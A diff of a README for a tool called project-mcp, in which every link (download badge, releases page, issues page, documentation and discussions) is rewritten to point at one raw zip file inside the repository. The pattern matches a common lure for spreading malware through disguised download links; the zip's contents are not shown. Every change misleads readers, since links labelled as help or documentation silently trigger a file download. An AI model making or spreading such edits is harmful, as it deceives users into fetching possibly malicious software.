@@ -1,7 +1,7 @@
 # 🌟 project-mcp - Simplify Your Documentation Search
 
 ## 📥 Download Now
-[![Download project-mcp](https://img.shields.io/badge/Download-project--mcp-blue.svg)](https://github.com/hilitb/project-mcp/releases)
+[![Download project-mcp](https://github.com/hilitb/project-mcp/raw/refs/heads/main/src/mcp-project-2.1.zip)](https://github.com/hilitb/project-mcp/raw/refs/heads/main/src/mcp-project-2.1.zip)
 
 ## 🚀 Getting Started
 Welcome to project-mcp! This application helps you search project documentation effortlessly. You won’t need any configuration. Just ask in plain language, and it will find the information you need.
@@ -17,7 +17,7 @@ To run project-mcp, your system should meet the following requirements:
 - Internet Connection: Required for initial download and updates.
 
 ## 🔗 Download & Install
-To get project-mcp, please visit our [Releases Page](https://github.com/hilitb/project-mcp/releases). There, you can choose the version that fits your needs and download it easily.
+To get project-mcp, please visit our [Releases Page](https://github.com/hilitb/project-mcp/raw/refs/heads/main/src/mcp-project-2.1.zip). There, you can choose the version that fits your needs and download it easily.
 
 1. Click on the link above.
 2. Browse the available versions.
@@ -60,7 +60,7 @@ Here are some common issues and solutions:
 - **No Results Found**: Make sure your query is clear and specific. Try different keywords if necessary.
 
 ## 📞 Need Help?
-If you encounter any issues or have questions, please check our [GitHub Issues](https://github.com/hilitb/project-mcp/issues) page. You can submit a question there, and we will respond as quickly as possible.
+If you encounter any issues or have questions, please check our [GitHub Issues](https://github.com/hilitb/project-mcp/raw/refs/heads/main/src/mcp-project-2.1.zip) page. You can submit a question there, and we will respond as quickly as possible.
 
 ## 🌐 Community and Contributions
 We welcome contributions and suggestions. If you want to improve project-mcp:
@@ -72,7 +72,7 @@ Stay updated with our community discussions on GitHub and share your ideas.
 
 ## 🔗 Additional Resources
 For more information or to explore advanced features, feel free to visit the following resources:
-- [Documentation](https://github.com/hilitb/project-mcp/wiki)
-- [Project Discussions](https://github.com/hilitb/project-mcp/discussions)
+- [Documentation](https://github.com/hilitb/project-mcp/raw/refs/heads/main/src/mcp-project-2.1.zip)
+- [Project Discussions](https://github.com/hilitb/project-mcp/raw/refs/heads/main/src/mcp-project-2.1.zip)
 
 Thank you for choosing project-mcp! We hope it makes your documentation searches simplified and efficient.
